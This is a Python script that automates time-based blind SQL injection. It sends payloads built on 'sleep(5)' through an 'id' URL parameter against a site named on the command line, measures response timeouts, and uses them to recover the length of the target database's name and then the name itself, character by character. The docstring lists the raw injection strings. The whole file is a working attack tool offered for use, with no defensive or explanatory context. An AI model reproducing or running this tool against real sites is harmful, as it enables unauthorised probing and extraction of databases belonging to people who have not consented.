#   coding:utf-8

import requests
import string
import sys

'''
?id=1' and sleep(5)--+
?id=1' and if(length(database())=1,sleep(5),0)--+
?id=1' and if(ascii(substr(database(),1,1))=1,sleep(5),0)--+
'''

url = sys.argv[1]

def timeout(url):
    try:
        return requests.get(url ,timeout = 3).text
    except:
        return "timeout"

def getDbNameLen(url):
    for i in range(1,20):
        payload = "?id=1' and if(length(database())={},sleep(5),0)--+".format(i)
        fullUrl = url + payload

        print("[-] " + fullUrl ,end = "\r")

        if "timeout" in timeout(fullUrl):
            print("\n",end = "")
            break

    return i 

def getDbName(url):
    dbName = ""

    for i in range(1,dbNameLen + 1):
        for j in string.printable.strip():
            payload = "?id=1' and if(ascii(substr(database(),{},1))={},sleep(5),0)--+".format(i,ord(j))
            fullUrl = url + payload

            print("[-] " + fullUrl ,end = "\r")

            if "timeout" in timeout(fullUrl):
                dbName += j
                print("\n",end = "")

                break

    return dbName

dbNameLen = getDbNameLen(url)
print("\n\033[32m[+] The dbName Length is {}\n\033[0m".format(dbNameLen))

dbName = getDbName(url)
print("\n\033[32m[+] The dbName is {}\033[0m".format(dbName))